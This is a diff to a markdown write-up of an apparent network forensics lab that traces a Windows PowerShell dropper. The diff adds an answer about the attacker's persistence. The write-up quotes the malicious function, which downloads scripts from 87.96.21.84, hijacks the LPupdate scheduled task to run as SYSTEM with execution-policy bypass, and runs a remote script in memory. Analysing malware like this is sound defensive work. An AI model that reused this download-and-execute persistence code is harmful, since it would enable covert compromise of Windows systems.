@@ -83,7 +83,7 @@ Filtering using `http and http.request.method==GET` in our wireshark we see that
 
 The scripts is actual a malware specifically a dropper which is used to compromise windows systems by disabling security features, check for privileges, establishes perisistance in essence it is the initial stage preparing the system for the main malware to drop either a cryptominer or a ransomware
 
-**ANS: `checking.ps1`***
+**ANS: `checking.ps1`**
 
 7. ***Understanding which group Security Identifier (SID) the malicious script checks to verify the current user's privileges can provide insights into the attacker's intentions. Can you provide the specific Group SID that is being checked?***
 
@@ -121,6 +121,25 @@ Using the query `http.request.method==GET` we can see there is a second script t
 
 10.***Identifying malicious tasks and understanding how they were used for persistence helps in fortifying defenses against future attacks. What's the full name of the task created by the attacker to maintain persistence?***
 
+Looking at the first script the attacker dropped `checking.ps1` ang going through the script thouroughly we can see that a scheduled task was created, attackers use `schtasks.exe` to maintain persistence 
+
+<img width="1278" height="803" alt="image" src="https://github.com/user-attachments/assets/e699e2fa-1a15-4c5b-b41f-9dfb76aa3d40" />
+
+The attacker here used a legitimate task `\Microsoft\Windows\MUI\LPupdate` which is used to update the windows language pack, why you may ask... well this is a trusted process and operates under high privilegesand can be easily overlooked. Attacker can hijack this trusted task and reference a malicious script. Looking at the full script
+
+`Function CleanerEtc {
+    $WebClient = New-Object System.Net.WebClient
+    $WebClient.DownloadFile("http://87.96.21.84/del.ps1", "C:\ProgramData\del.ps1") | Out-Null
+    C:\Windows\System32\schtasks.exe /f /tn "\Microsoft\Windows\MUI\LPupdate" /tr "C:\Windows\System32\cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\ProgramData\del.ps1" /ru SYSTEM /sc HOURLY /mo 4 /create | Out-Null
+    Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/ichigo-lite.ps1'))
+} `
+
+We see that the attacker downloads another script `del.ps1` and store it in `C:\ProgramData\` a common place to hide malware where there is No validation and No integrity check
+ then creates a sceduled task for persistene and overwrites it and bypasses the policy with `-ExecutionPolicy Bypass` and executes the malicious script and downloads another script and executes it in meory. Persistence with high privileges disguised as a windows component.
+
+ **ANS: `\Microsoft\Windows\MUI\LPupdate`**
+
+11. ***Based on your analysis of the second malicious file, What is the MITRE ID of the main tactic the second file tries to accomplish?***
 
 
 
@@ -130,6 +149,20 @@ Using the query `http.request.method==GET` we can see there is a second script t
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
 
 
 
